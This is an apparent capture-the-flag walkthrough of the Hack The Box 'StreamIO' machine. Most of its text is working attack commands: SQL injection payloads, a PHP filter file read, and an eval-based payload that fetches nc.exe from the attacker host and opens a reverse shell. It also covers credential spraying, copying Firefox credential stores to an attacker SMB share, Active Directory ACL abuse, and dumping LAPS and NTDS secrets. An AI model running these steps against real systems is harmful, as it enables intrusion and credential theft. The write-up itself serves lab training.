# [StreamIO](https://app.hackthebox.com/machines/streamio)

```bash
nmap -p- --min-rate 10000 10.10.11.158 -Pn
```

![Alt text](img/image.png)

After detection of open ports, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p53,80,88,135,139,489,443,445,464,593,636,3268,3269,5985,9389 10.10.11.158
```

![Alt text](img/image-1.png)


I added ip address into my '/etc/hosts' file as '**streamio.htb**'.



Let's do subdomain enumeration.
```bash
wfuzz -u https://streamio.htb -H "Host: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315   
```

![Alt text](img/image-2.png)


I also added `watch.streamio.htb` into '/etc/hosts' file.

![Alt text](img/image-3.png)


Let's fuzz web application to inject some payloads. I found `search.php`.

![Alt text](img/image-4.png)


Let's do SQL Injection
```bash
abcd' union select 1,2,3,4,5,6;-- -
```

![Alt text](img/image-5.png)


Let's modify this SQLI manually.
```bash
abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -
```

![Alt text](img/image-6.png)

Now, I got username and password list from users table.
```bash
abcd' union select 1,concat(username,':',password),3,4,5,6 from users;-- -
```

![Alt text](img/image-7.png)


I got all usernames and passwords from here, to brute-force `admin.php` side of application.

![Alt text](img/image-8.png)

admin:paddpadd
yoshihide:66boysandgirls..


While I login via `yoshihide` account, I can browse **'Admin Panel'**

![Alt text](img/image-9.png)


Now, I just search valid parameters for actions that Admin user can do. (need to add cookie header)
```bash
wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=1gjelvhioc1ckvb9c1kedva6r4"  --hh 1678
```

![Alt text](img/image-10.png)


While browsing below url for `debug` parameter, I can see base64 encoded version of source code.
`url=https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php`

![Alt text](img/image-11.png)


I see most dangerous part here, that `eval` function is used, it means we can do RCE or LFI & RFI.

![Alt text](img/image-12.png)


Let's check this.

![Alt text](img/image-13.png)


I can see from port (80). `nc -nlvp 80`

![Alt text](img/image-14.png)


Now, let's create malicious revshell and serve this on http server.

1.Create malicious reverse shell script (dr4ks.php) as below.
```bash
system("powershell -c wget http://10.10.16.6:8080/nc.exe -outfile \\programdata\\nc.exe");
system("\\programdata\\nc.exe -e powershell 10.10.16.6 1337");
```
![Alt text](img/image-15.png)

2.Then, open http server .
```bash
python3 -m http.server --bind 10.10.16.6 8080
```

![Alt text](img/image-16.png)

After submiting value into POST request as below.

![Alt text](img/image-17.png)


I got reverse shell from port (1337).

![Alt text](img/image-18.png)


I searched files which contain `database` string as below.
```bash
dir -recurse *.php | select-string -pattern "database"
```

![Alt text](img/image-19.png)


Let's look at the tables via `sqlcmd` command.
```bash
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```

![Alt text](img/image-20.png)


Now, I change query to read from `users` table.

```bash
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
```

![Alt text](img/image-21.png)


I crack these hashes via [Crackstation](https://crackstation.net)

![Alt text](img/image-22.png)

Here's my users.txt and passwords.txt file.

Let's use `crackmapexec` tool to find correct credentials.

```bash
crackmapexec smb 10.10.11.158 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
```

![Alt text](img/image-23.png)


I found credentials.


nikk37:get_dem_girls2@yahoo.com


Let's connect to Winrm via this credentials by using `evil-winrm` tool.

```bash
evil-winrm -i 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

user.txt

![Alt text](img/image-24.png)


After enumeration, I found stored credentials `key4.db and logins.json` file for user in Firefox's directory.

![Alt text](img/image-25.png)


1.To grab these files, I need to open SMB server.
```bash
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
```

![Alt text](img/image-27.png)

2.Then, use `copy` command to send files into my machine.
```bash
copy key4.db \\10.10.16.6\share\
copy logins.json \\10.10.16.6\share\
```

![Alt text](img/image-26.png)


I use this tool called [Firepwd](https://github.com/lclevy/firepwd).

```bash
python3 firepwd.py
```

![Alt text](img/image-28.png)


Here's my users.txt and passwords.txt file.

![Alt text](img/image-29.png)


Let's use `crackmapexec` tool to find correct credentials.

```bash
crackmapexec smb 10.10.11.158 -u users.txt -p passwords.txt --continue-on-success
```

![Alt text](img/image-30.png)

I found correct credentials.

JDgodd:JDg0dd1s@d0p3cr3@t0r


Let's use this domain account to dump all Active Directory.

```bash
bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip
```

![Alt text](img/image-31.png)


My user has 'WriteOwner' privilege for 'Core STAFF' Domain Group.

![Alt text](img/image-32.png)


And this Domain Group has privilege to read 'LAPS_Password'.

![Alt text](img/image-33.png)


I need to add my user into 'Core Staff' Group to read LAPS password.

For this, I will use [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) script.


I do this via `evil-winrm`.

```bash
upload PowerViews.ps1
. .\PowerView.ps1
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

![Alt text](img/image-34.png)

We can check via `net user JDgodd` command.

![Alt text](img/image-35.png)


Hola, it worked.


We use `crackmapexec` tool to dump LAPS password or NTDS data.
```bash
crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```

![Alt text](img/image-36.png)


administrator:4a-Z2a4@f0#r6s


root.txt

![Alt text](img/image-37.png)